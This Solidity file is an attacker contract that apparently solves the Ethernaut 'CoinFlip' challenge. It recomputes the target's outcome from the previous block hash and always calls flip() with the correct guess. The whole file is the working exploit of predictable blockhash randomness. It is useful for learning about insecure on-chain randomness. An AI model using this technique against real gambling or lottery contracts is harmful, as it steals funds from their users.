// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

contract FortuneTeller {
    using SafeMath for uint256;
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function predictFuture() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        bool prediction = blockValue.div(FACTOR) == 1 ? true : false;

        coinFlip.flip(prediction);
    }
}

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}
